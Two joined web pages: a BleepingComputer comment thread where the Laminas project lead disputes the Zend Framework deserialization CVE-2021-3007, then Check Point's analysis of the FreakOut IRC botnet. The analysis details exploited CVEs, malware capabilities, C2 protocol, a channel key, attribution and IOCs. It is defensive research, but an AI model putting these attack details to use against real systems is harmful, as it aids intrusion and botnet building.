* ![mwop Photo](data:image/gif;base64...)
  ###### [mwop](https://www.bleepingcomputer.com/forums/u/1190716/mwop/) - 4 years ago

  Hi - I am Project Lead for the Laminas Project, and formerly the project lead for Zend Framework.

  I'd like to point out a few things about this. First, the CVE in question has not been moderated or reviewed. We've had other journalists correctly come to us BEFORE reporting on the vulnerability for this very reason. Why do I bring this up? Because we were in contact with the researchers who reported the CVE at the end of November 2020, and had responded to them with essentially the same information as user Saeven reported in his earlier comment: this is a more generic PHP Object Injection vulnerability due to deserialization of untrusted user data. Assuming users follow standard industry security practices, the scenario should never present itself. Additionally, even with the code described in the CVE corrected (which we did via a release a short bit ago), the vulnerability can still be achieved by deserializing a class that includes a "\_\_destruct()" method... and this would be true in ANY PHP application.

  Our write-up is here: <https://github.com/laminas/laminas-http/pull/48>

  I would appreciate retraction of this article, or at least a nice big summary at the top indicating that the CVE in question is highly generic, and requires usage of known vulnerabilities in the PHP language to accomplish it.
* ![AxSharma Photo](data:image/gif;base64...)
  ###### [AxSharma](https://www.bleepingcomputer.com/forums/u/1164866/axsharma/) - 4 years ago

  Hello,

  Thanks for your feedback.

  I see in your pull request that Laminas now issued a patch to "verify a stream file name is a string before unlinking" in the concerned destructor to prevent the attackers from leveraging the gadget chain: <https://github.com/laminas/laminas-http/commit/019f31fe1c5449823e08ce98b0afd6835f5ffa32#diff-a1d5cc9e884a4772750d3bea9f1b8bda53fb383ef9990b3b2fffb95bfa672999R290>

  While I agree that the exploitation of untrusted deserialization requires poor code on the developer's side, in their app, and have already updated the article to strongly indicate this, the fix also shows it could have been prevented in the framework as well. Is that correct?

  Happy to understand this better and discuss via email, ax@axsharma.com or over Twitter DM.
* ![mwop Photo](data:image/gif;base64...)
  ###### [mwop](https://www.bleepingcomputer.com/forums/u/1190716/mwop/) - 4 years ago

  The fix in the framework is what is known as a security tightening measure. It is not indicative of a vulnerability, but it is a response to a potential misuse of our code. If you look carefully at the patch, two things specifically have to happen to cause the misuse:

  - The user must indicate that cleanup (removal of the file seeding the response stream) should occur once the response goes out of scope (at the end of the request).

  - The stream name must be presented as an object implementing "\_\_toString()".

  This latter is an interesting detail. PHP allows a number of "magic methods" in class definitions that fire under specific events in the runtime. "\_\_toString()" is one of these; when an object is used in a context where a string is expected, if it defines this method, then the method is called in order to produce a string representation. This is a hugely common practice; so much so that PHP 8 introduced a "Stringable" interface that defines it as the sole method required to fulfill its contract, and one of the chief arguments in favor of PHP 8's union types support was to allow typehints of "string|Stringable" to indicate that a string value is expected, but can be fulfilled by an object if desired.

  Another such method is "\_\_destruct()". This method is called when an object instance goes out of scope, which generally happens once code leaves a function or method, or, at the latest, when the request is completed and the response returned to the user. This is due to the fact that, generally speaking, PHP bootstraps every request and then tears its environment down when the request is complete. (I say generally speaking, because with some of the new async runtimes available, such as the Swoole extension or ReactPHP, you can have long-lived environments such as you might in Node.js. These applications are a very small percentage of overall PHP deployments, however.)

  The problem with magic methods such as these is that there are no limits to what you can do in them. Destructors are typically used to cleanup the environment — such as with operations like closing database or cache server connections, removing temp files, etc. Stringables are used in many scenarios, and particularly when providing complex representations or serializing data for API payloads. As such, they are used everywhere.

  It also means they are often targets of PHP Object Injection attacks. A PHP Object Injection attack relies on PHP's serialization engine, and the fact that it will serialize and deserialize any data structure, including classes. When deserializing a class instance, PHP will happily populate any properties at all when doing so.

  Unfortunately, prior to PHP 7.4, PHP did not allow providing typehints on class properties, which means that a deserialized instance can set the property values to any type at all, and thus avoid standard typechecks that occur elsewhere in a class — such as public setter methods. This is the primary reason why usage of "unserialize()" on untrusted user input is so dangerous, and why it is the root cause of this particular issue.

  What the CVE has done is bank on:

  - the fact that a destructor exists in a class

  - the destructor operating on the assumption that properties it queries were set using the defined class methods

  - the destructor using a property in a string context

  which allows the attacker to set the property to an instance of an object that defines a "\_\_toString()" method that in turn has side effects, composed in a class that defines a destructor which has side effects (removing a file).

  But all of this is predicated on the application author (\_not the framework\_) writing code that calls unserialize():

  - on user-provided input

  - without validation or sanitization

  - and without providing the second argument to "unserialize()" which provides a list of safe classes to deserialize

  I cannot stress this last set of points enough: the only way the framework code gets executed in the way described in the CVE is if the application author is writing code that is inherently insecure. While we can provide patches such as we have to mitigate such scenarios, these attacks rely on the researcher knowing that "unserialize()" is being used, knowing what classes are available in the application, and being able to exploit a magic method, generally a destructor, in one of those. As I've noted previously, magic methods are widely used in PHP; frameworks often have to rely on them in order to make things work correctly. The only feasible way a framework can prevent all such scenarios in code consuming it is to override the method "\_\_unserialize()" in each and every class it defines. No PHP frameworks do this; it's considered an application security issue, not a framework issue.

##### Post a Comment [Community Rules](https://www.bleepingcomputer.com/posting-guidelines/)

###### You need to login in order to post a comment

Not a member yet? [Register Now](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global&section=register)

### You may also like:

[![ThreatLocker](https://www.bleepstatic.com/c/t/threatlocker/ThreatLocker_400x500.png)](https://www.threatlocker.com/?utm_source=bleeping_computer&utm_medium=sponsor&utm_campaign=brand_enterprise_q1_25&utm_content=brand_enterprise&utm_term=display)

Popular Stories

* [![Microsoft 365](data:image/gif;base64...)

  Microsoft MFA outage blocking access to Microsoft 365 apps](https://www.bleepingcomputer.com/news/microsoft/microsoft-mfa-outage-blocking-access-to-microsoft-365-apps/)
* [![Apple](data:image/gif;base64...)

  Phishing texts trick Apple iMessage users into disabling protection](https://www.bleepingcomputer.com/news/security/phishing-texts-trick-apple-imessage-users-into-disabling-protection/)
* [![Key Decryptor Unlock](data:image/gif;base64...)

  Ransomware abuses Amazon AWS feature to encrypt S3 buckets](https://www.bleepingcomputer.com/news/security/ransomware-abuses-amazon-aws-feature-to-encrypt-s3-buckets/)

Sponsor Posts

* [![Criminal IP: Real-Time Phishing Protection for Outlook Users]()

  Criminal IP: Real-Time Phishing Protection for Outlook Users](https://appsource.microsoft.com/en-us/product/office/WA200007637?tab=Overview)
* [![Password health-check overdue? Audit your Active Directory for free]()

  Password health-check overdue? Audit your Active Directory for free](https://specopssoft.com/product/specops-password-auditor/?utm_source=bleepingcomputer&utm_medium=referral&utm_campaign=na_bleepingcomputer&utm_content=article)
* [![Save IT time with self-service password resets]()

  Save IT time with self-service password resets](https://specopssoft.com/product/specops-password-reset/?utm_source=bleepingcomputer&utm_medium=referral&utm_campaign=na_bleepingcomputer&utm_content=guest-post)
* [![Cynet Delivers 100% Protection and 100% Detection Visibility in 2024 MITRE ATT&CK Evaluation]()

  Cynet Delivers 100% Protection and 100% Detection Visibility in 2024 MITRE ATT&CK Evaluation](https://www.cynet.com/mitre-attck-results/?utm_source=BleepingComputer&utm_medium=sponsored_article&utm_campaign=Q4-sponsored-content&utm_content=MITREATT&CK2024)
* [![Protecting Against Malicious Browser Extensions: The Complete Guide]()

  Protecting Against Malicious Browser Extensions: The Complete Guide](https://go.layerxsecurity.com/the-complete-guide-to-protecting-against-malicious-browser-extensions?utm_source=bleeping)

##### Follow us:

##### Main Sections

* [News](https://www.bleepingcomputer.com/)
* [VPN Buyer Guides](https://www.bleepingcomputer.com/vpn/)
* [SysAdmin Software Guides](https://www.bleepingcomputer.com/sysadmin/)
* [Downloads](https://www.bleepingcomputer.com/download/)
* [Virus Removal Guides](https://www.bleepingcomputer.com/virus-removal/)
* [Tutorials](https://www.bleepingcomputer.com/tutorials/)
* [Startup Database](https://www.bleepingcomputer.com/startups/)
* [Uninstall Database](https://www.bleepingcomputer.com/uninstall/)
* [Glossary](https://www.bleepingcomputer.com/glossary/)

##### Community

* [Forums](https://www.bleepingcomputer.com/forums/)
* [Forum Rules](https://www.bleepingcomputer.com/forum-rules/)
* [Chat](https://www.bleepingcomputer.com/forums/t/730914/the-bleepingcomputer-official-discord-chat-server-come-join-the-fun/)

##### Useful Resources

* [Welcome Guide](https://www.bleepingcomputer.com/welcome-guide/)
* [Sitemap](https://www.bleepingcomputer.com/sitemap/)

##### Company

* [About BleepingComputer](https://www.bleepingcomputer.com/about/)
* [Contact Us](https://www.bleepingcomputer.com/contact/)
* [Send us a Tip!](https://www.bleepingcomputer.com/news-tip/)
* [Advertising](https://www.bleepingcomputer.com/advertise/)
* [Write for BleepingComputer](https://www.bleepingcomputer.com/write-for-bleepingcomputer/)
* [Social & Feeds](https://www.bleepingcomputer.com/rss-feeds/)
* [Changelog](https://www.bleepingcomputer.com/changelog/)

[Terms of Use](https://www.bleepingcomputer.com/terms-of-use/) -  [Privacy Policy](https://www.bleepingcomputer.com/privacy/) - [Ethics Statement](https://www.bleepingcomputer.com/ethics-statement/) - [Affiliate Disclosure](https://www.bleepingcomputer.com/affiliate-disclosure/)

Copyright @ 2003 - 2025  [Bleeping Computer® LLC](https://www.bleepingcomputer.com/)  - All Rights Reserved

#### Login

Username

Password

Remember Me

Sign in anonymously

[![Sign in with Twitter button](https://www.bleepstatic.com/images/site/login/twitter.png) Sign in with Twitter](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global&section=login&serviceClick=twitter&return=https://www.bleepingcomputer.com/news/security/zend-framework-disputes-rce-vulnerability-issues-patch/)

---

Not a member yet? [Register Now](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global§ion=register "Register account")

#### Reporter

###### Help us understand the problem. What is going on with this comment?

* Spam
* Abusive or Harmful
* Inappropriate content
* Strong language
* Other

Read our [posting guidelinese](https://www.bleepingcomputer.com/posting-guidelines/) to learn what content is prohibited.

Submitting...
SUBMIT



=== Content from research.checkpoint.com_123823d9_20250114_224123.html ===

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

* [CONTACT US](https://research.checkpoint.com/contact/)
* [DISCLOSURE POLICY](https://research.checkpoint.com/disclosure-policy/)
* [CHECKPOINT.COM](https://www.checkpoint.com/)
* [UNDER ATTACK?](https://www.checkpoint.com/about-us/contact-incident-response/)

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

* [Latest Publications](https://research.checkpoint.com/latest-publications/)
* [CPR Podcast Channel](https://research.checkpoint.com/cpr-podcast-channel/)
* [Web 3.0 Security](https://research.checkpoint.com/category/web3/)
* [Intelligence Reports](https://research.checkpoint.com/intelligence-reports/)
* Resources
  + [ThreatCloud AI](https://www.checkpoint.com/ai/)
  + [Threat Intelligence & Research](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  + [Zero Day Protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  + [Sandblast File Analysis](http://threatemulation.checkpoint.com/)
* [About Us](https://research.checkpoint.com/about-us/)
* [SUBSCRIBE](https://research.checkpoint.com/subscription/)

SUBSCRIBE

## CATEGORIES

* [Android Malware
  23](https://research.checkpoint.com/category/android-malware/)
* [Artificial Intelligence
  4](https://research.checkpoint.com/category/artificial-intelligence-2/)
* [ChatGPT
  3](https://research.checkpoint.com/category/chatgpt/)
* [Check Point Research Publications
  396](https://research.checkpoint.com/category/threat-research/)
* [Cloud Security
  1](https://research.checkpoint.com/category/cloud-security/)
* [CPRadio
  44](https://research.checkpoint.com/category/cpradio/)
* [Crypto
  2](https://research.checkpoint.com/category/crypto/)
* [Data & Threat Intelligence
  1](https://research.checkpoint.com/category/data-threat-intelligence/)
* [Data Analysis
  0](https://research.checkpoint.com/category/data-analysis/)
* [Demos
  22](https://research.checkpoint.com/category/demos/)
* [Global Cyber Attack Reports
  338](https://research.checkpoint.com/category/threat-intelligence-reports/)
* [How To Guides
  13](https://research.checkpoint.com/category/how-to-guides/)
* [Ransomware
  2](https://research.checkpoint.com/category/ransomware/)
* [Russo-Ukrainian War
  1](https://research.checkpoint.com/category/russo-ukrainian-war/)
* [Security Report
  1](https://research.checkpoint.com/category/security-report/)
* [Threat and data analysis
  0](https://research.checkpoint.com/category/threat-and-data-analysis/)
* [Threat Research
  172](https://research.checkpoint.com/category/threat-research-2/)
* [Web 3.0 Security
  9](https://research.checkpoint.com/category/web3/)
* [Wipers
  0](https://research.checkpoint.com/category/wipers/)

![](https://research.checkpoint.com/wp-content/uploads/2021/01/LinuxCVEs_blog_header.jpg)

# FreakOut – Leveraging Newest Vulnerabilities for creating a Botnet

January 19, 2021

https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/

Research By: Omer Ventura, Ori Hamama, Network Research

# Introduction

Recently, Check Point Research encountered several attacks that exploited multiple vulnerabilities, including some that were only recently published, to inject OS commands. The goal behind the attacks was to create an IRC botnet, which can later be used for several purposes, such as DDoS attacks or crypto-mining.

The attacks aim at devices that run one of the following:

* TerraMaster TOS(TerraMaster Operating System) – the operating system used for managing TerraMaster NAS (Network Attached Storage) servers
* Zend Framework –  a collection of packages used in building web application and services using PHP, with more than 570 million installations
* Liferay Portal – a free, open-source enterprise portal. It is a web application platform written in Java that offers features relevant for the development of portals and websites

![Figure1](//research.checkpoint.com/wp-content/uploads/2021/01/Figure1-1.png)

**Figure 1:** The products attacked by the campaign.

Each of the infected devices can be later used as an attacking platform, thus making the attack flow recursive. In a later variant, Xmrig causes the victim’s device to engage in coin-mining.

# FreakOut Infection Chain

![The attack flow of the campaign](//research.checkpoint.com/wp-content/uploads/2021/01/image1.png)

**Figure 2:** The attack flow of the campaign.

The campaign exploits these recent vulnerabilities: CVE-2020-28188, CVE-2021-3007 and CVE-2020-7961. These allow the attacker to upload and execute a Python script on the compromised servers.

### **CVE-2020-28188**

The vulnerability is caused by a lack of input validation in the “event” parameter in the “makecvs” PHP page (/include/makecvs.php). This allows a remote unauthenticated attacker to inject OS commands, and gain control of the servers using TerraMaster TOS (versions prior to  4.2.06).

![The attack exploiting CVE-2020-28188 as seen in the logs.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure3.png)

**Figure 3:** The attack exploiting CVE-2020-28188 as seen in our sensors.

### **CVE-2021-3007**

This vulnerability is caused by the unsecured deserialization of an object. In versions higher than Zend Framework 3.0.0, the attacker abuses the Zend3 feature that loads classes from objects in order to upload and execute malicious code in the server. The code can be uploaded using the “callback” parameter, which in this case inserts a malicious code instead of the “callbackOptions” array.

![The attack exploiting CVE-2021-3007 as seen in the logs.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure4.png)

**Figure 4:** The attack exploiting CVE-2021-3007 as seen in our sesnors.

### **CVE-2020-7961**

The vulnerability is a Java unmarshalling vulnerability via JSONWS in Liferay Portal (in versions prior to 7.2.1 CE GA2). Marshalling, which is similar to serialization, is used for communication with remote objects, in our case with a serialized object. Exploiting the vulnerability lets the attacker provide a malicious object, that when unmarshalled, allows remote code execution.

![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure5.png)

**Figure 5:** The attack exploiting CVE-2020-7961 as seen in our sensors.

In all the attacks involving these CVEs, the attacker’s first move is to try running different syntaxes of OS commands to download and execute a Python script named “out.py”.
After the script is downloaded and given permissions (using the “chmod” command), the attacker tries to run it using Python 2. Python 2 reached EOL (end-of-life) last year, meaning the attacker assumes the victim’s device has this deprecated product installed.

#

# The Python Code – out.py

The malware, downloaded from the site http://gxbrowser[.]net, is an obfuscated Python script consisting of polymorphic code. Many of the function names remain the same in each download, but there are multiple functions that are obfuscated using random strings generated by a packing function. The first attack trying to download the file was observed on January 8, 2021. Since then, hundreds of download requests from the relevant URL were made.

![The __init__ function of the main class of the code “out.py”. The code is obfuscated and encoded with several different functions. Each time it is downloaded, the code is obfuscated anew. differently.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure6.png)

**Figure 6:** The *\_\_init\_\_* function of the main class of the code *“out.py”.* The code is obfuscated and encoded with several different functions. Each time it is downloaded, the code is obfuscated anew. differently.

When we searched for the relevant domain and file in VirusTotal (VT), we found other codes called “out.py”.
These files were uploaded only a few hours before the attacks began, and had low scores of detections by the AVs presented in VirusTotal. All the files originated from the same domain, hxxp://gxbrowser[.]net, as this address is hardcoded in all scripts and is the only address that appears.

![Other codes related to the domain and IP.  Both are Python-based although the second is classified as Java.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure7.png)

**Figure 7:** Other codes related to the domain and IP. Both are Python-based although the second is classified as Java.

When we examined the first variation uploaded to VT (the third one in Fig.7) with our script, and compared the codes and their functions, it seemed to be a slightly earlier version of the code.

![Comparing the different files. They have some similarities in function names and comments that shed some light on the more obfuscated code.](//research.checkpoint.com/wp-content/uploads/2021/01/figure8-with_colors-1.png)

**Figure 8:** Comparing the different files. They have some similarities in function names and comments that shed some light on the more obfuscated code.

The code itself is less obfuscated, includes comments, and seems to be related to our attacker.

![Figure 9: An earlier version of the same function presented in Fig.3. This time it contained developer comments revealing some of the variables’ purposes.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure9.png)

**Figure 9:** An earlier version of the same function presented in Fig.6. This time it contained developer comments revealing some of the variables’ purposes.

In addition, in this version, the attacker left a calling card with relevant information, including the code developer’s name and an update that took place on January 1, 2021. All this information was omitted in the version we studied

![A calling card left in the earlier version of the code](//research.checkpoint.com/wp-content/uploads/2021/01/Figure10.png)

**Figure 10:** A calling card left in the earlier version of the code.

Comparing the two codes and the different comments helped reveal the code communication methods, the capabilities and the threat actor behind it.

# The Malware Capabilities

At this point, the facilities and capabilities of the malware became clearer.

There is a specific function for each of the main capabilities, making the code very modular and easy to change or maintain:

* Port Scanning utility
* Collecting system fingerprint
  + Includes the device address (MAC, IP), and memory information. These are used in different functions of the code for different checks
  + TerraMaster TOS version of the system
* Creating and sending packets
  + ARP poisoning for Man-in-the-Middle attacks.
  + Supports UDP and TCP packets, but also application layer protocols such as HTTP, DNS, SSDP, and SNMP
  + Protocol packing support created by the attacker.
* Brute Force – using hard coded credentials
  + With this list, the malware tries connecting to other network devices using Telnet. The function receives an IP range and tries to brute force each IP with the given credential. If it succeeds, the results of the correct credential are saved to a file, and sent in a message to the C2 server
* Handling sockets
  + Includes handling exceptions of runtime errors.
  + Supports multi-threaded communication to other devices. This allows simultaneous actions the bots can perform while listening to the server
* Sniffing the network
  + Executes using the “ARP poisoning” capability. The bot sets itself as a Man-in-the-Middle to other devices. The intercepted data is sent to the C2 server
* Spreading to different devices, using the “exploit” function.
  + Randomly generates the IPs to attack
  + Exploits the CVEs mentioned above (CVE-2020-7961 , CVE-2020-28188, CVE-2021-3007)
* Gaining persistence by adding itself to the rc.local configuration.
* DDOS and Flooding – HTTP, DNS, SYN
  + Self-implementation of Slowlaris. The malware creates many sockets to a relevant victim address for the purpose of instigating a DDoS attack
* Opening a reverse-shell – shell on the client
* Killing a process by name or ID
* Packing and unpacking the code using obfuscation techniques to provide random names to the different functions and variables

![Part of the function exploit, which is responsible for the spreading attempts. Exploits CVE-2020-7961, CVE-2020-28188 and CVE-2021-3007, after clarification.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure11.png)

**Figure 11:** Part of the function *exploit*, which is responsible for the spreading attempts. Exploits CVE-2020-7961, CVE-2020-28188 and CVE-2021-3007, after clarification.

# The Malware’s Communication

Each infected device is configured to communicate with a hardcoded C2 server. All the connection credentials are obfuscated and encoded in the code itself multiple times, and are generated using multiple functions.

At the initial connection to the server, the conversation begins with the client sending a “NICK message”, which declares the user nickname. The nickname is generated with this format:

**[HAX|**System OS**|**Machine Type**|**CPU count**] **8-12 random letters****

An example of the bot nickname as created by the script:

**[HAX|**Linux**|**x86\_64**|**3**] **QCRjbbnQm****

After declaring the nickname of the client, the client sends the username, which is the nickname plus the IRC address and the string “localhost  :”, followed by the bot nickname. When the server accepts this message, the communication begins.

Following a quick back and forth set of Ping-Pong messages, the server provides the client server information about the channels. Then, one minute later, the client can join channels on the server.

In FreakOut, the relevant channel was “#update” on the server “gxbrowser[.]net”.  The user must provide a channel key, used as a password, to connect to the channel. The key can be extracted from the code, and is equal to the string “N3Wm3W”.

![Communication with the server. Initiates the conversation with the relevant messages.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure12.png)

**Figure 12:** Communication with the server. Initiates the conversation with the relevant messages.

The client can now be used as a part of a botnet campaign and accepts command messages from the server to execute. The commands are sent using a symbols-based communication. Each message sent by the server is parsed and split into different symbols, with each one having a different meaning.

Every message includes the command name (i.e: udpflood, synflood) and the rest of the arguments change accordingly. When the client finishes executing the relevant command as received from C2, it then sends the results in a private message (PRIVMSG IRC command) to the relevant admin in the channel, providing it with relevant details.

![Communication with the server. The server accepts commands in the format mentioned above. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure13.png)

**Figure 13:** Communication with the server. The server accepts commands in the format mentioned above.

#

# The Impact

Based on the malware features, it seems that the attacker can use the compromised systems for further attacks, such as using the system resources for crypto-mining, spreading laterally across the company network, or launching attacks on outside targets while masquerading as the compromised company. We revealed further information about FreakOut when we used the algorithm-created credentials to connect to the server. After logging in, additional server information is provided to the client, including the room’s capacity, the users connected and even operators and unknown connections.

![After logging in, more information is provided about the server.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure14.png)

**Figure 14:** After logging in, more information is provided about the server.

The server was created in late November 2020 and has been running ever since with 300 current users and 5 channels. Exploring the different channels revealed a very active one, called #update. This channel includes 186 exploited devices communicating with the server, as seen in the messages exchanged between the IRC server and the client, and in the channel page:

![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure15a.png)![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure15b.png)

**Figure 15:** The #update channel, as seen in the IRC communication with the malware and in the IRC channel surfed through a web interface.

We observed two additional channels called “opers” (which probably stands for operators as we have seen the server admin there), and “andpwnz”. The network name of the server is called “Keknet”. Due to the fact the file was updated and released in January 2021, we believe this scale was reached in less than a week. Therefore, we can assume that this campaign will ratchet up to higher levels in the near future.

#

# Threat Actors

To identify the threat actors responsible for the attacks, we searched for leads in the internet and social media.  Searching for both the code author, who goes by the name “Freak” (which we have also seen in the IRC server channels) and the IRC bot name “N3Cr0m0rPh”, revealed information about the threat actor behind the campaign.

In a post published on HackForums back in 2015, submitted by the user “Fl0urite” with the title “N3Cr0m0rPh Polymorphic IRC BOT”, the bot is offered for sale in exchange for BitCoins (BTC). This bot seem to have many of the same capabilities as the current one, and the same description as the current bot in the calling card. However, some of the features were omitted over the years, such as the USB worm and the regedit ability.

![The post submitted by “Fl0urite” back in 2015. The name of the IRC bot is the same, with many similar capabilities. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure16.png)

**Figure 16:** The post submitted by “Fl0urite” back in 2015. The name of the IRC bot is the same, with many similar capabilities.

The name “Fl0urite” is mentioned in other hacking forums and GitHub, and is associated with multiple pieces of code which can be found on these sites that resemble the current malware code functions.

As mentioned previously, “Freak@PopulusControl” appears to be the author of  the latest code version. When we searched for these strings, we found several results, including an earlier version of the malware code (V6). In this version, however, the author left a comment, explaining the code is a free tool and that redistribution is allowed.

![V6](//research.checkpoint.com/wp-content/uploads/2021/01/1.png)

**Figure 17:** Version 6 of the code.

As mentioned previously,  the admin in the IRC channel is also called “Freak.”

![The user “Freak” joins and leaves the #update channel on the server. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure18.png)

**Figure 18:** The user “Freak” joins and leaves the #update channel on the server.

In early 2015 codes found on Pastebin , that were uploaded by the user “Keksec”, there seems to be a link between the two identities “Fl0urite” and “Freak” in several files. In addition, there is a link to the user “Fl0urite” on HackForums in these files signed by “Freak.” The other files uploaded by the user are signed with the exact string “Freak@PopulusControl (aka sudoer)” that seems to be associated with the malware functions as well. Based on this evidence, we conclude that both identities belong to the same person.

In the Pastebin, there are also files that were uploaded recently (January 12, 2021).

![Files uploaded to Pastebin.  The author presents himself as Freak/Fl0urite. The address is related to the user “Fl0urite” in HackForums, while later files uploaded are signed only with “Freak@PopulousControl.”](//research.checkpoint.com/wp-content/uploads/2021/01/Figure1920.png)

**Figure 19-20:** Files uploaded to Pastebin. The author presents himself as Freak/Fl0urite. The address is related to the user “Fl0urite” in Hack Forums, while later files uploaded are signed only with “Freak@PopulousControl.”

The URL of the site gxbrowser[.]net reveals the following page:

![The index page of gxbrowser[.]net](//research.checkpoint.com/wp-content/uploads/2021/01/Figure21.png)

**Figure 21:** The index page of gxbrowser[.]net

The page has the names “keksec” and “Freak” which were observed in the Pastebin files, and is also associated with the name “Keknet” seen in the IRC server.

Currently, it seems that “Freak” is using it to create a botnet.

On VT, and on the relevant Pastebin mentioned previously, there are other files related to the domain such as Crypto-mining malwares. In the latest code downloaded (January 12, 2021), it seems that the malware tries to exploit the vulnerabilities to install the Xmrig from the server hxxp://gxbrowser[.]net.

![Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure22.png)

**Figure 22:** The file xmrig1 on the server gxbrowser[.]net

![Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure23.png)

**Figure 23:** Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.

#

# Conclusion

FreakOut is an attack campaign that utilizes three vulnerabilities, including some newly released, to compromise different servers. The threat actor behind the attack, named “Freak”, managed to infect many devices in a short period of time, and incorporated them into a botnet, which in turn is used for DDoS attacks and crypto-mining. Such attack campaigns highlight the importance of taking sufficient precautions and updating your security protections on a regular basis. As we have observed, this is an ongoing campaign that can spread rapidly.

# MITRE ATT&CK TECHNIQUES

| [**Initial Access**](https://attack.mitre.org/tactics/TA0001) | [**Resource Development**](https://attack.mitre.org/tactics/TA0011/) | [**Execution**](https://attack.mitre.org/tactics/TA0002) | [**Persistence**](https://attack.mitre.org/tactics/TA0003) | [**Privilege Escalation**](https://attack.mitre.org/tactics/TA0004) | [**Defense Evasion**](https://attack.mitre.org/tactics/TA0005) | [**Credential Access**](https://attack.mitre.org/tactics/TA0006) | [**Discovery**](https://attack.mitre.org/tactics/TA0007/) | [**Lateral Movement**](https://attack.mitre.org/tactics/TA0008) | [**Collection**](https://attack.mitre.org/tactics/TA0009) | [**Command and Control**](https://attack.mitre.org/tactics/TA0011/) | [**Exfiltration**](https://attack.mitre.org/tactics/TA0010) | [**Impact**](https://attack.mitre.org/tactics/TA0040) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Exploit Public-Facing Application (T1190) | Acquire infrastructure: Domains (T1583/003) | Exploitation for Client Execution (T1203) | Event Triggered Execution: .bash\_profile and .bashrc (T1546/004) | Event Triggered Execution: .bash\_profile and .bashrc (T1546/004) | Deobfuscate/Decode Files or Information (T1140) | Brute Force (T1110) | Network Service Scanning (T1046) | Remote Services (T1021) | Network Sniffing (T1040) | Application Layer Protocol (T1071) | Exfiltration over C2 Channel (T1041) | Network Denial of Service Direct Network Flood (T1498/001) |
|  | Compromise Infrastructure: Botnet (T1584/005) | Command and Scripting Interpreter (T1059) |  |  | File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification (T1222/002) | Man-in-the-Middle: ARP Cache Poisoning (T1557/002) |  | Exploitation of Remote Services (T1210) | Data Staged: Local Data Staging (T1074/001) | Application Layer Protocol: Web Protocols (T1071/001) |  | Network Denial of Service Reflection Amplification (T1498/002) |
|  |  | Command and Scripting Interpreter: Python (T1059/006) |  |  |  |  |  |  |  | Application Layer Protocol: DNS (T1071/004) |  | Resource Hijacking (T1496) |
|  |  | Command and Scripting Interpreter: Unix Shell (T1059/004) |  |  |  |  |  |  |  | Data encoding (T1132) |  |  |
|  |  |  |  |  |  | ```   ``` | ```   ``` | ```   ``` | ```   ``` | Data Obfuscation (T1001) | ```   ``` | ```   ``` |

# Protections

Check Point customers are protected by these protections:

#### IPS

* TerraMaster TOS Command Injection (CVE-2020-28188).
* Liferay Portal Insecure Deserialization (CVE-2020-7961).
* Zend Framework Remote Code Execution (CVE-2021-3007).
* CMD Injection Over HTTP

#### Anti-Bot

* Win32.IRC.G
* N3Cr0m0rPh.TC.a
* Win32.N3Cr0m0rPh.TC.a
* Win32.N3Cr0m0rPh.TC.b
* Win32.N3Cr0m0rPh.TC.c
* Win32.N3Cr0m0rPh.TC.d

#

# IOCs

* hxxp://gxbrowser[.]net
* 7c7273d0ac2aaba3116c3021530c1c868dc848b6fdd2aafa1deecac216131779 – out.py (less obfuscated)
* 05908f2a1325c130e3a877a32dfdf1c9596d156d031d0eaa54473fe342206a65 – out.py (more obfuscated)
* ac4f2e74a7b90b772afb920f10b789415355451c79b3ed359ccad1976c1857a8 – out.py (including the xmrig1 installation)
* ac6818140883e0f8bf5cef9b5f965861ff64cebfe181ff025e1f0aee9c72506cOut – xmrig1

# References

* https://kiwiirc.com/

[![](https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg)

GO UP](#single-post)

[BACK TO ALL POSTS](/latest-publications/)

## POPULAR POSTS

[![](https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg)](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

* Artificial Intelligence
* ChatGPT
* Check Point Research Publications

[OPWNAI : Cybercriminals Starting to Use ChatGPT](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

[![](https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg)](https://research.checkpoint.com/2019/hacking-fortnite/)

* Check Point Research Publications
* Threat Research

[Hacking Fortnite Accounts](https://research.checkpoint.com/2019/hacking-fortnite/)

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg)](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

* Artificial Intelligence
* ChatGPT
* Check Point Research Publications

[OpwnAI: AI That Can Save the Day or HACK it Away](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

### BLOGS AND PUBLICATIONS

